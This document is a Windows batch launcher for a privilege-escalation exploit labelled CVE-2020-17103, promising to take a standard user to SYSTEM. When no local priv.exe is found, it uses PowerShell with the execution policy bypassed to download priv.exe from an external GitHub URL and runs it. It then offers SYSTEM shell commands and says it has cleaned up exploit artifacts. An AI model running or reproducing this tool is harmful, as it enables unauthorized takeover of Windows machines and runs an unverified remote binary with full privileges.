@echo off
setlocal EnableDelayedExpansion
title PRIV - Escalation Tool

cls
echo.
echo  +------------------------------------------+
echo  ^|  PRIV  ^|  CVE-2020-17103                 ^|
echo  ^|  Standard User -^> NT AUTHORITY\SYSTEM    ^|
echo  +------------------------------------------+
echo.
echo  Inside the SYSTEM shell you can type:
echo    power        switch to PowerShell (same window)
echo    cmdnew       new SYSTEM cmd window
echo    psnew        new SYSTEM PowerShell window
echo    unpriv       exit SYSTEM shell and cleanup
echo.
echo  Press any key to begin...
pause >nul

:: Use local priv.exe if present, otherwise download to temp
set BAT_DIR=%~dp0
set BAT_DIR=%BAT_DIR:~0,-1%
set PRIV_EXE=%BAT_DIR%\priv.exe

if not exist "%PRIV_EXE%" (
    echo.
    echo [*] Downloading priv.exe...
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
        "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
        "(New-Object Net.WebClient).DownloadFile(" ^
        "'https://raw.githubusercontent.com/Dylanthedabber/EasyPlasma/main/priv.exe'," ^
        "'%TEMP%\priv.exe')"
    if not exist "%TEMP%\priv.exe" (
        echo [-] Download failed. Check your internet connection.
        pause & exit /b 1
    )
    set PRIV_EXE=%TEMP%\priv.exe
    echo [+] Downloaded
)

echo.
echo [*] Starting escalation...
echo.

"%PRIV_EXE%"

echo.
echo [*] Returned to user context.
echo [*] All exploit artifacts have been cleaned.
echo.
pause
